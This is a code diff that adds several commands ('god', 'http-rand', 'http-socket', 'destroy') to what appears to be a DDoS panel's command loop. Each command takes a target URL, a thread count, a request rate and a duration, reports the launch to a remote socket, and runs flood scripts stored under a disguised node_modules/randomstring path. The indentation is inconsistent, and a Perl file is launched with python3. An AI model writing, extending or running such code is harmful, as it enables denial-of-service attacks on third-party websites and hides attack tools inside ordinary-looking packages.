@@ -76,7 +76,62 @@ def main():
             except IndexError:
                 print('Usage: flood <target> <workers> <rpc> <timer>')
                 print('Example: flood https://example.com 500 250 60')
+		    
+#177MEMBERS
+	elif "god" in cnc:
+            try:
+                url = cnc.split()[1]
+                thread = cnc.split()[2]
+                rpc = cnc.split()[3]
+                time = cnc.split()[4]
+                sendsocket(socket_url, f"\n\n---------------\nFLOOD\n---------------\nTarget: {url}\nThreads: {thread}\nRpc: {rpc}\nTime: {time}\n---------------\n‎ \n‎ \n‎ ")
+                flood = os.path.join("node_modules/randomstring/examples/methods", "flood.py")
+                os.system(f'python3 {flood} {url} {thread} {rpc} {time}')
+            except IndexError:
+                print('Usage: flood <target> <workers> <rpc> <timer>')
+                print('Example: flood https://example.com 500 250 60')
+
+        elif "http-rand" in cnc:
+            try:
+                url = cnc.split()[1]
+                thread = cnc.split()[2]
+                rpc = cnc.split()[3]
+                time = cnc.split()[4]
+                sendsocket(socket_url, f"\n\n---------------\nFLOOD\n---------------\nTarget: {url}\nThreads: {thread}\nRpc: {rpc}\nTime: {time}\n---------------\n‎ \n‎ \n‎ ")
+                flood = os.path.join("node_modules/randomstring/examples/methods", "flood.py")
+                os.system(f'python3 {flood} {url} {thread} {rpc} {time}')
+            except IndexError:
+                print('Usage: flood <target> <workers> <rpc> <timer>')
+                print('Example: flood https://example.com 500 250 60')
                 
+        elif "http-socket" in cnc:
+            try:
+                url = cnc.split()[1]
+                thread = cnc.split()[2]
+                rpc = cnc.split()[3]
+                time = cnc.split()[4]
+                sendsocket(socket_url, f"\n\n---------------\nFLOOD\n---------------\nTarget: {url}\nThreads: {thread}\nRpc: {rpc}\nTime: {time}\n---------------\n‎ \n‎ \n‎ ")
+                flood = os.path.join("node_modules/randomstring/examples/methods", "flood.py")
+                os.system(f'python3 {flood} {url} {thread} {rpc} {time}')
+            except IndexError:
+                print('Usage: flood <target> <workers> <rpc> <timer>')
+                print('Example: flood https://example.com 500 250 60')
+
+	elif "destroy" in cnc:
+            try:
+                url = cnc.split()[1]
+                thread = cnc.split()[2]
+                rpc = cnc.split()[3]
+                time = cnc.split()[4]
+                sendsocket(socket_url, f"\n\n---------------\nFLOOD\n---------------\nTarget: {url}\nThreads: {thread}\nRpc: {rpc}\nTime: {time}\n---------------\n‎ \n‎ \n‎ ")
+                flood = os.path.join("node_modules/randomstring/examples/methods", "destroy.pl")
+                os.system(f'python3 {flood} {url} {thread} {rpc} {time}')
+            except IndexError:
+                print('Usage: flood <target> <workers> <rpc> <timer>')
+                print('Example: flood https://example.com 500 250 60')
+                
+                
+	    
         else:
             try:
                 cmmnd = cnc.split()[0]
